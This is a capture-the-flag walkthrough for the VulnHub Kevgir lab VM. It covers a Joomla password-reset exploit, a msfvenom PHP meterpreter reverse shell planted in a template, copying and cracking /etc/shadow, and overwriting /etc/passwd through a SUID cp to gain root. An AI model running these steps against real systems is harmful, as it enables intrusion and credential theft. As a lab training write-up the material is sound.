@@ -1,0 +1,102 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Kevgir VM (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-kevgir-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-09-08T04:39:08+00:00">September 8, 2016</time><time class="updated" datetime="2025-06-10T20:30:38+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this article, we will walkthrough a root2boot penetration testing challenge i.e Kevgir. Kevgir is a vulnerable framework, based on the concept of CTF(Capture The Flag). This lab can be solved in multiple ways, one of them is used in this article.</span></p>
+<h3><span style="color: #800000;"> <strong>Penetrating Methodologies</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
+<li><span style="color: #000000;">Joomla based CMS Scanning CMS (Joomscan)</span></li>
+<li><span style="color: #000000;">Exploiting target (exploit 6234)</span></li>
+<li><span style="color: #000000;">Login into the admin console</span></li>
+<li><span style="color: #000000;">Generate PHP Backdoor (Msfvenom)</span></li>
+<li><span style="color: #000000;">Upload and execute a backdoor</span></li>
+<li><span style="color: #000000;">Reverse connection (Metasploit)</span></li>
+<li><span style="color: #000000;">Import python one-liner for proper TTY shell</span></li>
+<li><span style="color: #000000;">Find SUID Binaries for Privilege Escalation</span></li>
+<li><span style="color: #000000;">Abusing shadow &amp; password file</span></li>
+<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Let’s Start!!!</strong></span></p>
+<p><span style="color: #000000;">First Download Kevgir Vm From <a style="color: #000000;" href="https://www.vulnhub.com/?q=kevgir&amp;sort=date-asc&amp;type=vm"><strong>Here</strong></a></span></p>
+<p><span style="color: #000000;">Start off with finding the target using :</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Q0SwTWaB4cM/WxeHpeVve_I/AAAAAAAAXLA/EMNrfgxUD8wk52pRQDawS0QkMGpG5AaGwCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Our target is <strong>192.168.1.102 </strong>Now scan the target with nmap :</span></p>
+<pre class="lang:default decode:true">nmap -p- -A 192.168.1.102</pre>
+<p><span style="color: #000000;">With the nmap scan, you can see the ports 80, 139, 2049, 6379, 8080, 8081, 9000, 40383 and many others are open as you can see in the image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-39Qq8Mpe3us/WxeHsKF3K3I/AAAAAAAAXLw/myImctqG6Y04cRBOSX3A092ctDylbXupQCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Also, if you observe then you can see port forwarding is used here e.g. HTTP service is open on port number 80, 8080 and 8081. So, let us try open our target on 80 and 8081 port.</span></p>
+<p><span style="color: #000000;">On port 80 Our target opens as the following:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-NPGNHm6B0NI/WxeHsoNTV3I/AAAAAAAAXL4/Uvz_CRgiJUYGRgVtl5N1xP5xpJ8zm7bXwCLcBGAs/s1600/3.png"/></span></p>
+<p> </p>
+<p><span style="color: #000000;">And on port 8081 opens on :</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SkgHPMzhwpU/WxeHstUckbI/AAAAAAAAXL8/06kboLrDDdwO_Qo1A2uHegWgi660IZbOwCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">The cms of the website are Joomla and this version of Joomla, as everyone knows, is exploitable. We will scan the said target with joomscan :</span></p>
+<pre class="lang:default decode:true">joomscan -u http://192.168.1.102:8081</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rtj-KwyIfuY/WxeHsw9rtcI/AAAAAAAAXMA/R8t5BKS8VyoYrVCoVf3VLUhIXHS_y_6zgCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Applying the joomscan will show all the vulnerable exploits. Here we can observe the highlighted text pointing towards “Admin Password changed” seems to be vulnerable against exploit 6234. Now if you look closely the exploit number 6234 will show you the steps to exploit the certain vulnerability.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ZkmfsfFdkBs/WxeHtTkTS_I/AAAAAAAAXMM/qRlkkbrCnvUGXS4vDwXIKfUdX4FqftHTQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">According to the said, go for exploring the following URL:</span></p>
+<pre class="lang:default decode:true">192.168.1.102:8081/index.php?optiona=com_user&amp;view=reset&amp;layout=confirm</pre>
+<p><span style="color: #000000;">Here, it will ask you for the token, type an <strong>apostrophe (‘)</strong> in the token adjacent text box.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-bZcncyuqZ6Y/WxeHtPNZtkI/AAAAAAAAXME/O4hVpO0SxaMVS6IAQ5bIxLLv6tDVjBsLQCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">It will redirect you to a page where it will ask you to set up a new password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AADrR2pb-N0/WxeHtW5iQJI/AAAAAAAAXMI/tsye8PaN3cUs4H-eInWnT501kE2qXRTkACLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">After setting up the new password, login with the username and the password that you had just set.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-mW3GayBtWcQ/WxeHtuVPM5I/AAAAAAAAXMQ/1WDZF2yKMRk6PidG1QN-3jIVTy-vWKQNgCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Now that you are logged in, go to the <strong>Extensions</strong> menu and select <strong>Template Manager </strong>from the drop-down menu.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Hx8PTiywxy0/WxeHplYmYnI/AAAAAAAAXLI/K911H2-Kr14KKih_EjcVaprpG3t2_hzTQCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Then choose <strong>Extensions</strong> &gt; <strong>Template Manager</strong> &gt; <strong>rhuk_milkway</strong> &gt; <strong>Edit HTML</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-NyB_90BCH98/WxeHqMICMwI/AAAAAAAAXLM/hUq8zGsN7AYKE-e5nBwTVgSt-kIxzsMAgCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Inside this, we can add our own PHP code but instead of editing genuine PHP for new template we will add malicious PHP code.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ja7biDweoo0/WxeHqSCGXDI/AAAAAAAAXLQ/QqmIoBPD_pwp_oI-d3A9D0mJy8BGLSJLwCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Create the malicious code that you are going to upload via msfvenom.</span></p>
+<pre class="lang:default decode:true ">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw</pre>
+<p><span style="color: #000000;">On the other hand run multi/handler inside the Metasploit framework</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-g6dRvzj_0RI/WxeONdo3RaI/AAAAAAAAXMw/uuRu0Ys6kLkn0tQvJ7JVR767S4qHelypQCLcBGAs/s1600/14.1.png"/></span></p>
+<p><span style="color: #000000;">Copy the code from &gt;?php to die(); and Paste the code inside HTML editor and click on<strong> save button.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5zyx3zTSrPY/WxeOZIKEZfI/AAAAAAAAXNQ/98Il_uzjgngfjibyi-_tVLwPrcBcgr-fQCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Meanwhile, return to the Metasploit terminal and wait for the metepreter session by exploiting multi handler.</span></p>
+<pre class="lang:default decode:true">msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 192.168.1.108
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit</pre>
+<p><span style="color: #000000;">From given below image you can observe <strong>Meterpreter session 1</strong>. But the task is not finished yet, still, we need to penetrate more for privilege escalation.</span></p>
+<pre class="lang:default decode:true">meterpreter &gt; sysinfo
+meterpreter &gt; shell</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-6pF9guvepCI/WxeOTpdYCuI/AAAAAAAAXM0/qGIsYgXOPGwJO-oUETPAwGm03U-7hXguACLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Then to access proper TTY shell we had import python one line script by typing following:</span></p>
+<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">Now for privilege escalation either we can use find command to enumerate enabled SUID bit for any system binaries or we move into the etc/bin to enumerate enabled SUID bit any binaries file.</span></p>
+<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null
+or
+cd /etc/bin
+ls -al</pre>
+<p><span style="color: #000000;">Hence we can clearly observe the SUID bit is set for cp for copy command, to copy any file which required higher privilege to perform read/write operation upon them such as etc/passwd &amp; etc/shadow files.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-xZZmLM9q4d8/WxeOT7z2F7I/AAAAAAAAXM8/NoGc96Oi-oMx59nTYyALhWgDUp42OvrvACLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Therefore we copied etc/shadow inside tmp and open it inside /tmp directory. The shadow files hold encrypted password of users and we are have copied the hash password for user: admin as shown.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zy5EvH3Aw0U/WxeOTsFWeRI/AAAAAAAAXM4/bKo4dXrpU8o_21gWf-4Mn5q8OWBUfGXYwCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Now we have pasted the above-copied text in an empty document and used John the ripper for cracking this hash value. As result, you can observe the password:<strong> admin</strong> for user: <strong>admin</strong>. This method is known as SUID binaries privilege escalation, for more detail read this <a style="color: #000000;" href="http://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">article</a>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Fhy0YJ96Ch0/WxeOUE6qmJI/AAAAAAAAXNA/e1v8GVKYDuIFE67k2R2KgxZdNrNAFQu0QCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">But the task is not completed yet, this boot to root challenge and still, we are lacking root privilege.  Now open the password file with help of cat where you will find an entry for admin. Now we know the admin user’s password and by manipulating his entries, we can increase his privileges and do so <strong>copy </strong>the whole content of this file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7_zalmE1IKQ/WxeOUdtwaDI/AAAAAAAAXNE/ADFcmOvXRo8CFgAeWr-Ss41T1pdIFuVaQCLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;"><strong>Paste</strong> it into an empty text file, now <strong>modify UID: 1002 &amp; GID: 1002 into</strong> <strong>UID: 0</strong> &amp; <strong>GID: 0</strong> for adding admin into root group member and saved as passwd so that we can replace original passwd file from our modified passwd file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BNeZ5KrnglA/WxeOU-QymhI/AAAAAAAAXNI/SmxIBgilBiwwasyEc1-1eTjaI0fXQIzBQCLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">Download the modified password file inside /tmp directory with help of wget as shown.</span></p>
+<pre class="lang:default decode:true">wget http://192.168.1.108/passwd</pre>
+<p><span style="color: #000000;">Now replace the content of the original passwd file from our modified passwd file with help of copy command and it is possible due to SUID bit which is enabled for /bin/cp file. After then switch user with help of su command and you will get root access after that as shown below.</span></p>
+<pre class="lang:default decode:true">cp passwd /etc/
+su admin</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-yl67VfDxbNs/WxeOU5qUVZI/AAAAAAAAXNM/qeA-cDIOnzAxJV1yl3H2H-kbZ6ctEwTagCLcBGAs/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">HURRAYYYY!!! We hit the Goal and finish this task. But this lab can be solved in multiple ways for example use kernel privilege escalation for privilege escalation.</span></p>
+<p><span style="color: #000000;">Try it by yourself and enjoy the CTF challenges!!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
